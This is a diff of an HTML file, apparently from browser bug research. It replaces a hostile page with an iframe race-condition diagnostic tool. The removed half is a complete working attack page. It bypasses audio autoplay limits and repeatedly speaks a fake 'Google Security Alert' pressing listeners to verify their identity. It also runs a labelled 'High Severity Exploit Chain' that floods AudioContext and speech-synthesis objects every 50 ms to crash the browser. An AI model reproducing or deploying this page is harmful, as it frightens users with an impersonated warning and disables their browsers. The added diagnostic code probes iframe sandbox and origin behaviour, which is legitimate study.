@@ -3,207 +3,108 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert</title>
+<title>Iframe Race Condition Diagnostics</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; min-height: 100vh; overflow: hidden; }
-  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
+  body { background: #121212; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; color: #e5e5e5; }
+  .panel { background: #1e1e1e; padding: 28px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); max-width: 580px; width: 100%; border: 1px solid #333; }
+  h2 { color: #60a5fa; margin-bottom: 8px; font-size: 18px; }
+  p { color: #a3a3a3; font-size: 13px; margin-bottom: 14px; line-height: 1.5; }
+  label { display: block; font-size: 12px; color: #cbd5e1; margin-bottom: 4px; }
+  input { width: 100%; padding: 9px 12px; margin-bottom: 12px; border-radius: 8px; border: 1px solid #404040; background: #121212; color: #fff; font-family: monospace; font-size: 12px; }
+  button { padding: 12px 16px; background: #2563eb; color: #fff; border: none; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; width: 100%; }
+  button:hover { background: #1d4ed8; }
+  iframe { width: 100%; height: 110px; border: 1px solid #3f3f46; border-radius: 8px; background: #09090b; margin-top: 12px; }
+  #log { margin-top: 12px; padding: 12px; background: #0b0b0b; border-radius: 8px; font-family: monospace; font-size: 11px; color: #93c5fd; max-height: 220px; overflow-y: auto; white-space: pre-wrap; }
 </style>
 </head>
 <body>
+
+<div class="panel">
+  <h2>Iframe Attribute &amp; Load Race Observer</h2>
+  <p>Memantau balapan antara mutasi atribut <code>srcdoc</code>/<code>src</code>/<code>sandbox</code>, <code>queueMicrotask</code>, <code>requestAnimationFrame</code>, dan <code>load</code> pada <code>&lt;iframe&gt;</code>.</p>
+
+  <label for="raceUrl">Target URL untuk uji race load/assign:</label>
+  <input id="raceUrl" type="text" value="https://example.com" />
+
+  <label for="raceIterations">Jumlah iterasi mutasi cepat saat race:</label>
+  <input id="raceIterations" type="number" value="15" min="1" max="200" />
+
+  <button id="raceBtn">Run Iframe Race</button>
+
+  <iframe id="raceFrame" title="Iframe Race Probe"></iframe>
+  <div id="log">[*] Ready...</div>
+</div>
+
 <script>
 (function () {
   'use strict';
 
-  // ============================================
-  // KONFIGURASI AUTOPLAY
-  // ============================================
-  var CONFIG = {
-    tts: {
-      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
-      lang: 'en-US',
-      rate: 0.85,
-      pitch: 1.0,
-      volume: 1.0,
-      repeatInterval: 8000,
-      maxRepeats: 20
-    },
-    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
-  };
+  var raceUrlInput = document.getElementById('raceUrl');
+  var iterInput = document.getElementById('raceIterations');
+  var raceBtn = document.getElementById('raceBtn');
+  var frame = document.getElementById('raceFrame');
+  var logEl = document.getElementById('log');
+  var t0 = performance.now();
 
-  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
-
-  // ============================================
-  // TTS — TANPA CANCEL DI DALAM LOOP
-  // ============================================
-  function speakOnce() {
-    if (!('speechSynthesis' in window)) return;
-    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
-
-    try {
-      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
-      u.lang = CONFIG.tts.lang;
-      u.rate = CONFIG.tts.rate;
-      u.pitch = CONFIG.tts.pitch;
-      u.volume = CONFIG.tts.volume;
-
-      var voices = window.speechSynthesis.getVoices();
-      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
-      if (enVoice) u.voice = enVoice;
-
-      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
-      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
-      u.onend = function () {
-        state.ttsCount++;
-        if (state.ttsCount < CONFIG.tts.maxRepeats) {
-          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
-        }
-      };
-
-      window.speechSynthesis.speak(u);
-    } catch (e) { console.log('[TTS] fail:', e.message); }
+  function log(msg) {
+    var elapsed = (performance.now() - t0).toFixed(1);
+    var line = `[+${elapsed}ms] ${msg}`;
+    logEl.textContent += '\n' + line;
+    logEl.scrollTop = logEl.scrollHeight;
+    console.log('[IframeRace] ' + line);
   }
 
-  function startTTS() {
-    if (state.ttsStarted) return;
-    state.ttsStarted = true;
-    window.speechSynthesis.cancel();
-    speakOnce();
-  }
-
-  // ============================================
-  // AUDIO CONTEXT UNLOCK
-  // ============================================
-  function unlockAudioContext() {
+  function inspectFrame(tag) {
     try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      if (ctx.state === 'suspended') {
-        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
-      }
-      var osc = ctx.createOscillator();
-      var gain = ctx.createGain();
-      gain.gain.value = 0.0001;
-      osc.frequency.value = 20000;
-      osc.connect(gain);
-      gain.connect(ctx.destination);
-      osc.start();
-      osc.stop(ctx.currentTime + 0.1);
-    } catch (e) {}
-  }
-
-  // ============================================
-  // SILENT AUDIO ELEMENT
-  // ============================================
-  function trySilentAudio() {
-    try {
-      var a = new Audio(CONFIG.silentWav);
-      a.volume = 0.0001;
-      a.loop = true;
-      var p = a.play();
-      if (p && p.catch) p.catch(function(){});
-    } catch (e) {}
-  }
-
-  // ============================================
-  // MAIN AUDIO (Web Audio API)
-  // ============================================
-  function playMainAudio() {
-    if (state.mainPlayed) return;
-    state.mainPlayed = true;
-
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      var sr = ctx.sampleRate;
-      var dur = 3.0;
-      var buf = ctx.createBuffer(1, sr * dur, sr);
-      var d = buf.getChannelData(0);
-
-      for (var i = 0; i < d.length; i++) {
-        var t = i / sr;
-        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
-        var env = Math.max(0, 1 - t / dur);
-        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
-      }
-
-      var src = ctx.createBufferSource();
-      src.buffer = buf;
-      src.connect(ctx.destination);
-      src.start();
-      src.onended = startTTS;
-      setTimeout(startTTS, 3500);
-    } catch (e) {
-      startTTS();
+      var doc = frame.contentDocument;
+      var loc = frame.contentWindow ? frame.contentWindow.location.href : 'n/a';
+      log(`[${tag}] accessible -> loc=${loc}, readyState=${doc ? doc.readyState : 'none'}`);
+    } catch (err) {
+      log(`[${tag}] blocked (${err.name}) -> ${err.message}`);
     }
   }
 
-  // ============================================
-  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
-  // ============================================
-  function triggerHighSeverityCrash() {
-    console.log("[!] Initiating High Severity Exploit Chain...");
-    
-    // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
-    setInterval(function() {
-      try {
-        for (var i = 0; i < 2000; i++) {
-          var ctx = new (window.AudioContext || window.webkitAudioContext)();
-          var osc = ctx.createOscillator();
-          var gain = ctx.createGain();
-          
-          // Memaksa alokasi node audio secara simultan tanpa penutupan (close)
-          osc.connect(gain);
-          gain.connect(ctx.destination);
-          osc.start(0);
-          
-          // 2. Flooding Speech Utterance Queue
-          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
-          window.speechSynthesis.speak(u);
-        }
-      } catch(e) {}
-    }, 50); // Eksekusi super cepat setiap 50 milidetik
-  }
+  frame.addEventListener('load', function () {
+    log(`event:load -> sandbox="${frame.getAttribute('sandbox') || ''}", hasSrcdoc=${frame.hasAttribute('srcdoc')}`);
+    inspectFrame('onLoad');
+  });
 
-  // ============================================
-  // EKSEKUSI BERTAHAP
-  // ============================================
-  unlockAudioContext();
-  trySilentAudio();
+  raceBtn.addEventListener('click', function () {
+    var targetUrl = raceUrlInput.value.trim() || 'https://example.com';
+    var count = Math.max(1, Math.min(200, parseInt(iterInput.value, 10) || 15));
 
-  setTimeout(function () {
-    unlockAudioContext();
-    startTTS(); // coba TTS lebih awal
-  }, 100);
+    log(`[*] Memulai iframe race -> url=${targetUrl}, iterations=${count}`);
 
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-  }, 500);
-
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-    if (!state.ttsStarted) startTTS();
-    
-    // PANGGIL CRASH TRIGGER DI SINI
-    triggerHighSeverityCrash();
-    
-  }, 1500);
-
-  // Retry jika audio diblokir
-  var retryCount = 0;
-  var retry = setInterval(function () {
-    retryCount++;
-    unlockAudioContext();
-    trySilentAudio();
-    if (!state.ttsStarted) startTTS();
-    if (retryCount > 10) clearInterval(retry);
-  }, 2000);
-
-  // Visibility change
-  document.addEventListener('visibilitychange', function () {
-    if (!document.hidden && !state.mainPlayed) {
-      setTimeout(playMainAudio, 100);
+    for (var i = 1; i <= count; i++) {
+      (function (idx) {
+        queueMicrotask(function () {
+          frame.setAttribute('srcdoc', `<p style="font-family:monospace;color:#93c5fd;margin:8px;">Race tick #${idx}</p>`);
+          if (idx === count) {
+            log(`[microtask] selesai mutasi srcdoc #${idx}`);
+          }
+        });
+      })(i);
     }
+
+    requestAnimationFrame(function () {
+      log('[rAF_1] mutate sandbox & assign src');
+      frame.setAttribute('sandbox', 'allow-scripts');
+      frame.removeAttribute('srcdoc');
+      frame.src = targetUrl;
+      inspectFrame('after_src_assign');
+
+      requestAnimationFrame(function () {
+        inspectFrame('rAF_2');
+      });
+    });
+
+    setTimeout(function () {
+      inspectFrame('timeout_300ms');
+    }, 300);
   });
 })();
 </script>
+
 </body>
 </html>
